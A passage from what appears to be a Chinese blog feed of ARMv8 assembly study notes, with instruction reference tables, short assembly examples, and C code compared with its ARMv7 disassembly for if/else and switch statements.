<td><code>MNEG</code></td>
<td>Multiply negate</td>
</tr>
<tr>
<td><code>MSUB</code></td>
<td>Multiply subtract</td>
</tr>
<tr>
<td><code>MUL</code></td>
<td>Multiply</td>
</tr>
<tr>
<td><code>SMADDL</code></td>
<td>Signed multiply-add long</td>
</tr>
<tr>
<td><code>SMNEGL</code></td>
<td>Signed multiply-negate long</td>
</tr>
<tr>
<td><code>SMSUBL</code></td>
<td>Signed multiply-subtract long</td>
</tr>
<tr>
<td><code>SMULH</code></td>
<td>Signed multiply returning high half</td>
</tr>
<tr>
<td><code>SMULL</code></td>
<td>Signed multiply long</td>
</tr>
<tr>
<td><code>UMADDL</code></td>
<td>Unsigned multiply-add long</td>
</tr>
<tr>
<td><code>UMNEGL</code></td>
<td>Unsigned multiply-negate long</td>
</tr>
<tr>
<td><code>UMSUBL</code></td>
<td>Unsigned multiply-subtract long</td>
</tr>
<tr>
<td><code>UMULH</code></td>
<td>Unsigned multiply returning high half</td>
</tr>
<tr>
<td><code>UMULL</code></td>
<td>Unsigned multiply long</td>
</tr>
<tr>
<td><strong>Divide instructions</strong></td>
<td></td>
</tr>
<tr>
<td><code>SDIV</code></td>
<td>Signed divide</td>
</tr>
<tr>
<td><code>UDIV</code></td>
<td>Unsigned divide</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MUL X0, X1, X2   // X0 = X1 * X2</span><br><span class="line">MNEG X0, X1, X2  // X0 = -(X1 * X2)</span><br><span class="line"></span><br><span class="line">UDIV W0, W1, W2  // W0 = W1 / W2 (unsigned, 32-bit divide)</span><br><span class="line">SDIV X0, X1, X2  // X0 = X1 / X2 (signed, 64-bit divide)</span><br></pre></td></tr></table></figure>

<h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><table>
<thead>
<tr>
<th>Instruction</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Shift</strong></td>
<td></td>
</tr>
<tr>
<td><code>ASR</code></td>
<td>Arithmetic shift right</td>
</tr>
<tr>
<td><code>LSL</code></td>
<td>Logical shift left</td>
</tr>
<tr>
<td><code>LSR</code></td>
<td>Logical shift right</td>
</tr>
<tr>
<td><code>ROR</code></td>
<td>Rotate right</td>
</tr>
<tr>
<td><strong>Move</strong></td>
<td></td>
</tr>
<tr>
<td><code>MOV</code></td>
<td>Move</td>
</tr>
<tr>
<td><code>MVN</code></td>
<td>Bitwise NOT</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// x1 = x0 / 8</span><br><span class="line">lsr     x1, x0, 3</span><br><span class="line"></span><br><span class="line">// x1 = x0 * 4</span><br><span class="line">lsl     x1, x0, 2</span><br></pre></td></tr></table></figure>

<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-19-15-20.png" class="">


<h3 id="位和字节操作指令"><a href="#位和字节操作指令" class="headerlink" title="位和字节操作指令"></a>位和字节操作指令</h3><table>
<thead>
<tr>
<th>Mnemonic</th>
<th>Operands</th>
<th>Instruction</th>
</tr>
</thead>
<tbody><tr>
<td><code>BFI</code></td>
<td><code>Rd, Rn, #lsb, #width</code></td>
<td>Bitfield Insert copies any number of low-order bits from a source register into the same number of adjacent bits at any position in the destination register, leaving other bits unchanged.</td>
</tr>
<tr>
<td><code>BFM</code></td>
<td><code>Rd, Rn, #immr, #imms</code></td>
<td>Bitfield Move copies any number of low-order bits from a source register into the same number of adjacent bits at any position in the destination register, leaving other bits unchanged.</td>
</tr>
<tr>
<td><code>BFXIL</code></td>
<td><code>Rd, Rn, #lsb, #width</code></td>
<td>Bitfield extract and insert at low end copies any number of low-order bits from a source register into the same number of adjacent bits at the low end in the destination register, leaving other bits unchanged.</td>
</tr>
<tr>
<td><code>CLS</code></td>
<td><code>Rd, Rn</code></td>
<td>Count leading sign bits.</td>
</tr>
<tr>
<td><code>CLZ</code></td>
<td><code>Rd, Rn</code></td>
<td>Count leading zero bits.</td>
</tr>
<tr>
<td><code>EXTR</code></td>
<td><code>Rd, Rn, Rm, #lsb</code></td>
<td>Extract register extracts a register from a pair of registers.</td>
</tr>
<tr>
<td><code>RBIT</code></td>
<td><code>Rd, Rn</code></td>
<td>Reverse Bits reverses the bit order in a register.</td>
</tr>
<tr>
<td><code>REV16</code></td>
<td><code>Rd, Rn</code></td>
<td>Reverse bytes in 16-bit halfwords reverses the byte order in each 16-bit halfword of a register.</td>
</tr>
<tr>
<td><code>REV32</code></td>
<td><code>Rd, Rn</code></td>
<td>Reverse bytes in 32-bit words reverses the byte order in each 32-bit word of a register.</td>
</tr>
<tr>
<td><code>REV64</code></td>
<td><code>Rd, Rn</code></td>
<td>Reverse Bytes reverses the byte order in a 64-bit general-purpose register.</td>
</tr>
<tr>
<td><code>SBFIZ</code></td>
<td><code>Rd, Rn, #lsb, #width</code></td>
<td>Signed Bitfield Insert in Zero zeroes the destination register and copies any number of contiguous bits from a source register into any position in the destination register, sign-extending the most significant bit of the transferred value. Alias of SBFM.</td>
</tr>
<tr>
<td><code>SBFM</code></td>
<td><code>Wd, Wn, #immr, #imms</code></td>
<td>Signed Bitfield Move copies any number of low-order bits from a source register into the same number of adjacent bits at any position in the destination register, shifting in copies of the sign bit in the upper bits and zeros in the lower bits.</td>
</tr>
<tr>
<td><code>SBFX</code></td>
<td><code>Rd, Rn, #lsb, #width</code></td>
<td>Signed Bitfield Extract extracts any number of adjacent bits at any position from a register, sign-extends them to the size of the register, and writes the result to the destination register.</td>
</tr>
<tr>
<td><code>&#123;S,U&#125;XT&#123;B,H,W&#125;</code></td>
<td><code>Rd, Rn</code></td>
<td>(S)igned&#x2F;(U)nsigned eXtend (B)yte&#x2F;(H)alfword&#x2F;(W)ord extracts an 8-bit,16-bit or 32-bit value from a register, zero-extends it to the size of the register, and writes the result to the destination register. Alias of UBFM.</td>
</tr>
</tbody></table>
<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-21-46-28.png" class="">

<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-21-48-58.png" class="">

<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-21-49-14.png" class="">


<h3 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h3><table>
<thead>
<tr>
<th>Mnemonic</th>
<th>Operands</th>
<th>Instruction</th>
</tr>
</thead>
<tbody><tr>
<td><code>CCMN</code> (immediate)</td>
<td><code>Rn, #imm, #nzcv, cond</code></td>
<td>Conditional Compare Negative (immediate) sets the value of the condition flags to the result of the comparison of a register value and a negated immediate value if the condition is TRUE, and an immediate value otherwise.</td>
</tr>
<tr>
<td><code>CCMN</code> (register)</td>
<td><code>Rn, Rm, #nzcv, cond</code></td>
<td>Conditional Compare Negative (register) sets the value of the condition flags to the result of the comparison of a register value and the inverse of another register value if the condition is TRUE, and an immediate value otherwise.</td>
</tr>
<tr>
<td><code>CCMP</code> (immediate)</td>
<td><code>Rn, #imm, #nzcv, cond</code></td>
<td>Conditional Compare (immediate) sets the value of the condition flags to the result of the comparison of a register value and an immediate value if the condition is TRUE, and an immediate value otherwise.</td>
</tr>
<tr>
<td><code>CCMP</code> (register)</td>
<td><code>Rn, Rm, #nzcv, cond</code></td>
<td>Conditional Compare (register) sets the value of the condition flags to the result of the comparison of two registers if the condition is TRUE, and an immediate value otherwise.</td>
</tr>
<tr>
<td><code>CSEL</code></td>
<td><code>Rd, Rn, Rm, cond</code></td>
<td>Conditional Select returns, in the destination register, the value of the first source register if the condition is TRUE, and otherwise returns the value of the second source register.</td>
</tr>
<tr>
<td><code>CSINC</code></td>
<td><code>Rd, Rn, Rm, cond</code></td>
<td>Conditional Select Increment returns, in the destination register, the value of the first source register if the condition is TRUE, and otherwise returns the value of the second source register incremented by 1. Used by CINC and CSET.</td>
</tr>
<tr>
<td><code>CSINV</code></td>
<td><code>Rd, Rn, Rm, cond</code></td>
<td>Conditional Select Invert returns, in the destination register, the value of the first source register if the condition is TRUE, and otherwise returns the bitwise inversion value of the second source register. Used by CINV and CSETM.</td>
</tr>
<tr>
<td><code>CSNEG</code></td>
<td><code>Rd, Rn, Rm, cond</code></td>
<td>Conditional Select Negation returns, in the destination register, the value of the first source register if the condition is TRUE, and otherwise returns the negated value of the second source register. Used by CNEG.</td>
</tr>
<tr>
<td><code>CSET</code></td>
<td><code>Rd, cond</code></td>
<td>Conditional Set sets the destination register to 1 if the condition is TRUE, and otherwise sets it to 0.</td>
</tr>
<tr>
<td><code>CSETM</code></td>
<td><code>Rd, cond</code></td>
<td>Conditional Set Mask sets all bits of the destination register to 1 if the condition is TRUE, and otherwise sets all bits to 0.</td>
</tr>
<tr>
<td><code>CINC</code></td>
<td><code>Rd, Rn, cond</code></td>
<td>Conditional Increment returns, in the destination register, the value of the source register incremented by 1 if the condition is TRUE, and otherwise returns the value of the source register.</td>
</tr>
<tr>
<td><code>CINV</code></td>
<td><code>Rd, Rn, cond</code></td>
<td>Conditional Invert returns, in the destination register, the bitwise inversion of the value of the source register if the condition is TRUE, and otherwise returns the value of the source register.</td>
</tr>
<tr>
<td><code>CNEG</code></td>
<td><code>Rd, Rn, cond</code></td>
<td>Conditional Negate returns, in the destination register, the negated value of the source register if the condition is TRUE, and otherwise returns the value of the source register.</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CSINC X0, X1, X0, NE  // Set the return register X0 to X1 if Zero flag clear, else increment X0</span><br><span class="line">CINC X0, X0, LS       // If less than or same (LS) then X0 = X0 + 1</span><br><span class="line">CSET W0, EQ           // If the previous comparison was equal (Z=1) then W0 = 1, </span><br><span class="line">                      // else W0 = 0</span><br><span class="line">CSETM X0, NE          // If not equal then X0 = -1, else X0 = 0 </span><br><span class="line"></span><br><span class="line">                      //if (i == 0) r = r + 2; else r = r - 1;</span><br><span class="line">CMP w0, #0            // if (i == 0)</span><br><span class="line">SUB w2, w1, #1        // r = r - 1</span><br><span class="line">ADD w1, w1, #2        // r = r + 2</span><br><span class="line">CSEL w1, w1, w2, EQ   // select between the two results</span><br></pre></td></tr></table></figure>

<h2 id="内存访问指令"><a href="#内存访问指令" class="headerlink" title="内存访问指令"></a>内存访问指令</h2><h3 id="加载和存储指令"><a href="#加载和存储指令" class="headerlink" title="加载和存储指令"></a>加载和存储指令</h3><table>
<thead>
<tr>
<th>Mnemonic</th>
<th>Operands</th>
<th>Instruction</th>
</tr>
</thead>
<tbody><tr>
<td>&#96;LDR(B</td>
<td>H</td>
<td>SB</td>
</tr>
<tr>
<td>&#96;LD(B</td>
<td>H</td>
<td>SB</td>
</tr>
<tr>
<td>&#96;STR(B</td>
<td>H</td>
<td>SB</td>
</tr>
<tr>
<td>&#96;STR(B</td>
<td>H</td>
<td>SB</td>
</tr>
<tr>
<td><code>LDP</code></td>
<td>&#96;Wt1, Wt2, [Xn</td>
<td>SP], #imm&#96;</td>
</tr>
<tr>
<td><code>STP</code></td>
<td>&#96;Wt1, Wt2, [Xn</td>
<td>SP], #imm&#96;</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// load a byte from x1</span><br><span class="line">ldrb    w0, [x1]</span><br><span class="line"></span><br><span class="line">// load a signed byte from x1</span><br><span class="line">ldrsb   w0, [x1]</span><br><span class="line"></span><br><span class="line">// store a 32-bit word to address in x1</span><br><span class="line">str     w0, [x1]</span><br><span class="line"></span><br><span class="line">// load two 32-bit words from stack, advance sp by 8</span><br><span class="line">ldp     w0, w1, [sp], 8</span><br><span class="line"></span><br><span class="line">// store two 64-bit words at [sp-96] and subtract 96 from sp </span><br><span class="line">stp     x0, x1, [sp, -96]!</span><br><span class="line"></span><br><span class="line">// load 32-bit immediate from literal pool</span><br><span class="line">ldr     w0, =0x12345678</span><br></pre></td></tr></table></figure>

<h3 id="寻址模式"><a href="#寻址模式" class="headerlink" title="寻址模式"></a>寻址模式</h3><table>
<thead>
<tr>
<th>Addressing Mode</th>
<th>Immediate</th>
<th>Register</th>
<th>Extended Register</th>
</tr>
</thead>
<tbody><tr>
<td>Base register only (no offset)</td>
<td><code>[base&#123;, 0&#125;]</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Base plus offset</td>
<td><code>[base&#123;, imm&#125;]</code></td>
<td><code>[base, Xm&#123;, LSL imm&#125;]</code></td>
<td>&#96;[base, Wm, (S</td>
</tr>
<tr>
<td>Pre-indexed</td>
<td><code>[base, imm]!</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Post-indexed</td>
<td><code>[base], imm</code></td>
<td><code>[base], Xm a</code></td>
<td></td>
</tr>
<tr>
<td>Literal (PC-relative)</td>
<td><code>label</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// load a byte from x1</span><br><span class="line">ldrb   w0, [x1]</span><br><span class="line"></span><br><span class="line">// load a half-word from x1</span><br><span class="line">ldrh   w0, [x1]</span><br><span class="line"></span><br><span class="line">// load a word from x1</span><br><span class="line">ldr    w0, [x1]</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1</span><br><span class="line">ldr    x0, [x1]</span><br><span class="line"></span><br><span class="line">// load a byte from x1 plus 1</span><br><span class="line">ldrb   w0, [x1, 1]</span><br><span class="line"></span><br><span class="line">// load a half-word from x1 plus 2</span><br><span class="line">ldrh   w0, [x1, 2]</span><br><span class="line"></span><br><span class="line">// load a word from x1 plus 4</span><br><span class="line">ldr    w0, [x1, 4]</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1 plus 8</span><br><span class="line">ldr    x0, [x1, 8]</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1 using x2 as index</span><br><span class="line">// w2 is multiplied by 8</span><br><span class="line">ldr    x0, [x1, x2, lsl 3]</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1 using w2 as index</span><br><span class="line">// w2 is zero-extended and multiplied by 8</span><br><span class="line">ldr    x0, [x1, w2, uxtw 3]</span><br><span class="line">// load a byte from x1 plus 1, then advance x1 by 1</span><br><span class="line">ldrb   w0, [x1, 1]!</span><br><span class="line"></span><br><span class="line">// load a half-word from x1 plus 2, then advance x1 by 2</span><br><span class="line">ldrh   w0, [x1, 2]!</span><br><span class="line"></span><br><span class="line">// load a word from x1 plus 4, then advance x1 by 4</span><br><span class="line">ldr    w0, [x1, 4]!</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1 plus 8, then advance x1 by 8</span><br><span class="line">ldr    x0, [x1, 8]!</span><br><span class="line">// load a byte from x1, then advance x1 by 1</span><br><span class="line">ldrb   w0, [x1], 1</span><br><span class="line"></span><br><span class="line">// load a half-word from x1, then advance x1 by 2</span><br><span class="line">ldrh   w0, [x1], 2</span><br><span class="line"></span><br><span class="line">// load a word from x1, then advance x1 by 4</span><br><span class="line">ldr    w0, [x1], 4</span><br><span class="line"></span><br><span class="line">// load a doubleword from x1, then advance x1 by 8</span><br><span class="line">ldr    x0, [x1], 8</span><br><span class="line"></span><br><span class="line">  // load address of label</span><br><span class="line">adr    x0, label</span><br><span class="line"></span><br><span class="line">// load address of label</span><br><span class="line">adrp   x0, label</span><br></pre></td></tr></table></figure>

<h2 id="流程控制指令"><a href="#流程控制指令" class="headerlink" title="流程控制指令"></a>流程控制指令</h2><table>
<thead>
<tr>
<th>Mnemonic</th>
<th>Operands</th>
<th>Instruction</th>
</tr>
</thead>
<tbody><tr>
<td><code>B</code></td>
<td><code>label</code></td>
<td>Branch causes an unconditional branch to a label at a PC-relative offset, with a hint that this is not a subroutine call or return.</td>
</tr>
<tr>
<td><code>B.cond</code></td>
<td><code>label</code></td>
<td>Branch conditionally to a label at a PC-relative offset, with a hint that this is not a subroutine call or return.</td>
</tr>
<tr>
<td><code>BL</code></td>
<td><code>label</code></td>
<td>Branch with Link branches to a PC-relative offset, setting the register X30 to PC+4. It provides a hint that this is a subroutine call.</td>
</tr>
<tr>
<td><code>BLR</code></td>
<td><code>Xn</code></td>
<td>Branch with Link to Register calls a subroutine at an address in a register, setting register X30 to PC+4.</td>
</tr>
<tr>
<td><code>BR</code></td>
<td><code>Xn</code></td>
<td>Branch to Register branches unconditionally to an address in a register, with a hint that this is not a subroutine return.</td>
</tr>
<tr>
<td><code>CBNZ</code></td>
<td><code>Rn, label</code></td>
<td>Compare and Branch on Nonzero compares the value in a register with zero, and conditionally branches to a label at a PC-relative offset if the comparison is not equal. It provides a hint that this is not a subroutine call or return. This instruction does not affect the condition flags.</td>
</tr>
<tr>
<td><code>CBZ</code></td>
<td><code>Rn, label</code></td>
<td>Compare and Branch on Zero compares the value in a register with zero, and conditionally branches to a label at a PC-relative offset if the comparison is equal. It provides a hint that this is not a subroutine call or return. This instruction does not affect condition flags.</td>
</tr>
<tr>
<td><code>RET</code></td>
<td><code>Xn</code></td>
<td>Return from subroutine branches unconditionally to an address in a register, with a hint that this is a subroutine return.</td>
</tr>
<tr>
<td><code>TBNZ</code></td>
<td><code>Rn, #imm, label</code></td>
<td>Test bit and Branch if Nonzero compares the value of a bit in a general-purpose register with zero, and conditionally branches to a label at a PC-relative offset if the comparison is not equal. It provides a hint that this is not a subroutine call or return. This instruction does not affect condition flags.</td>
</tr>
<tr>
<td><code>TBZ</code></td>
<td><code>Rn, #imm, label</code></td>
<td>Test bit and Branch if Zero compares the value of a test bit with zero, and conditionally branches to a label at a PC-relative offset if the comparison is equal. It provides a hint that this is not a subroutine call or return. This instruction does not affect condition flags.</td>
</tr>
</tbody></table>
<h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><table>
<thead>
<tr>
<th>Mnemonic</th>
<th>Instruction</th>
</tr>
</thead>
<tbody><tr>
<td><code>MSR</code></td>
<td>Move general-purpose register to System Register allows the PE to write an AArch64 System register from a general-purpose register.</td>
</tr>
<tr>
<td><code>MRS</code></td>
<td>Move System Register allows the PE to read an AArch64 System register into a general-purpose register.</td>
</tr>
<tr>
<td><code>SVC</code></td>
<td>Supervisor Call causes an exception to be taken to EL1.</td>
</tr>
<tr>
<td><code>NOP</code></td>
<td>No Operation does nothing, other than advance the value of the program counter by 4. This instruction can be used for instruction alignment purposes.</td>
</tr>
</tbody></table>
<h1 id="指令记录"><a href="#指令记录" class="headerlink" title="指令记录"></a>指令记录</h1><p>本节主要记录一些自已不知道其含义的指令，后续通过查询资料后才弄懂的指令，由于比较容易忘记，故记录下来。</p>
<h2 id="IT"><a href="#IT" class="headerlink" title="IT"></a>IT</h2><p>分支语句（If-Then），该指令根据特定条件来执行紧随其后的 1~4 条指令，格式为 <code>IT&#123;x&#123;y&#123;z&#125;&#125;&#125; &#123;cond&#125;</code>。其中 x 、y 、z 分别是执行第二、三、四条指令的条件，可取的值为 <code>T(Then)</code>或 <code>E(Else)</code>，对应于条件的成立和不成立。下面来看例子：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ITETT</span> EQ</span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R0</span>, <span class="number">#1</span><span class="comment">;	//指令1</span></span><br><span class="line"><span class="keyword">MOVNE</span> <span class="built_in">R0</span>, <span class="number">#0</span><span class="comment">;	//指令2</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R1</span>, <span class="number">#0</span><span class="comment">;	//指令3</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R2</span>, <span class="number">#0</span><span class="comment">;	//指令4</span></span><br></pre></td></tr></table></figure>
<p>如图，若 <code>EQ</code> 条件符合（根据 <code>CPSR</code> 寄存器 <code>Z</code> 的值判断），执行指令 1 、3 、4 的 <code>mov</code> 操作，否则执行指令 2 的 <code>mov</code> 操作。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://modexp.wordpress.com/2018/10/30/arm64-assembly/">A Guide to ARM64 &#x2F; AArch64 Assembly on Linux with Shellcodes and Cryptography</a></p>
<p><a href="https://static.docs.arm.com/den0024/a/DEN0024A_v8_architecture_PG.pdf">DEN0024A_v8_architecture_PG.pdf</a></p>
<p><a href="https://courses.cs.washington.edu/courses/cse469/19wi/arm64.pdf">ARMv8 A64 Quick Reference</a></p>
]]></content>
      <categories>
        <category>ARMv8汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8学习记录五</title>
    <url>/2021/04/10/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%94/</url>
    <content><![CDATA[<h1 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h1><h2 id="if…else-if…else"><a href="#if…else-if…else" class="headerlink" title="if…else if…else"></a>if…else if…else</h2><p>c语言代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc &gt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc &gt; 1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(argc == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc == 1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc &lt; 1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的ARMv7代码：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R4</span>, <span class="number">#2</span></span><br><span class="line">                <span class="keyword">BLT</span>             loc_5C0</span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc1 - <span class="number">0x5C0</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc &gt; 1&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5CE</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5C0</span>                                 <span class="comment">; CODE XREF: main+4C↑j</span></span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R4</span>, <span class="number">#1</span></span><br><span class="line">                <span class="keyword">BNE</span>             loc_5CA</span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc1_0 - <span class="number">0x5CA</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc == 1&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5CE</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5CA</span>                                 <span class="comment">; CODE XREF: main+56↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc1_1 - <span class="number">0x5D0</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc &lt; 1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5CE</span>                                 <span class="comment">; CODE XREF: main+52↑j</span></span><br><span class="line">                                        <span class="comment">; main+5C↑j</span></span><br><span class="line">                <span class="keyword">BLX</span>             printf</span><br><span class="line">                <span class="keyword">MOVS</span>            <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line">                <span class="keyword">POP</span>             &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R7</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<p>在IDA中对应的结构：</p>
<p><img src="/2021-04-18-17-51-04.png"></p>
<h2 id="switch…case"><a href="#switch…case" class="headerlink" title="switch…case"></a>switch…case</h2><h3 id="case后的值连续或间隔不大"><a href="#case后的值连续或间隔不大" class="headerlink" title="case后的值连续或间隔不大"></a>case后的值连续或间隔不大</h3><p>C语言代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(argc)&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 0&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 1&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 5&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 6&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 8&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 9&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的ARMv7代码：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">                <span class="keyword">PUSH</span>            &#123;<span class="built_in">R7</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line">                <span class="keyword">MOV</span>             <span class="built_in">R7</span>, <span class="built_in">SP</span></span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#9</span>  <span class="comment">; switch 10 cases</span></span><br><span class="line">                <span class="keyword">BHI</span>             def_574 <span class="comment">; jumptable 00000574 default case</span></span><br><span class="line">                TBB.W           [<span class="built_in">PC</span>,<span class="built_in">R0</span>] <span class="comment">; switch jump</span></span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">;使用做表的方式定位case块</span></span><br><span class="line"><span class="symbol">jpt_574</span>         <span class="meta">DCB</span> <span class="number">5</span>                   <span class="comment">; jump table for switch statement</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">8</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x18</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x18</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x18</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0xB</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0xE</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x18</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x11</span></span><br><span class="line">                <span class="meta">DCB</span> <span class="number">0x14</span></span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_582</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc0 - <span class="number">0x588</span>) <span class="comment">; jumptable 00000574 case 0</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 0&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5A4</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_588</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc1 - <span class="number">0x58E</span>) <span class="comment">; jumptable 00000574 case 1</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 1&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5A4</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_58E</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc5 - <span class="number">0x594</span>) <span class="comment">; jumptable 00000574 case 5</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 5&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5A4</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_594</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc6 - <span class="number">0x59A</span>) <span class="comment">; jumptable 00000574 case 6</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span 